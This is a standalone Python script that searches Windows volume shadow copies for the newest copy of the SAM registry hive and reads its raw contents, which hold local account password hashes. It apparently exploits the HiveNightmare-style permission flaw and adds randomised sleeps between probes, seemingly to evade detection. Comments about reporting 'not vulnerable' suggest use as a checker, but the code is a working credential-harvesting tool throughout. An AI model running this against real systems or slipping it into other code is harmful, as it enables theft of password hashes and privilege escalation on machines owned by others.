from os import stat
from random import random, randint
from time import sleep

min_sleep = 1
max_sleep = 5

def get_newest_hashes():
    global min_sleep
    global max_sleep

    hive_base = r'\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy{i}\Windows\System32\config\SAM'
    hive_n = 1    
    newest = None
    finding_newest_hive = True
    newest_hashes = None

    try:
        current_hive = hive_base.format(i=hive_n)
        current_stat = stat(current_hive)
        newest = (current_hive, current_stat)
        sleep(random() * randint(min_sleep,max_sleep))
    except PermissionError as e:
        # permission error: report not vulnerable
        return None
    except FileNotFoundError as e:
        # no shadows: report not vulnerable
        return None    

    while finding_newest_hive:
        try:
            current_hive = hive_base.format(i=hive_n+1)
            current_stat = stat(current_hive)
            if current_stat.st_ctime > newest[1].st_ctime:
                newest = (current_hive, current_stat)
            else:
                break
            hive_n += 1
            sleep(random() * randint(min_sleep,max_sleep))
        except FileNotFoundError as e:
            # reached the end
            finding_newest_hive = False
            print(newest[0])
            break

    if newest is not None:
        with open(newest[0], 'rb') as f:
            newest_hashes = f.read()

    return newest_hashes

if __name__ == "__main__":
    get_newest_hashes()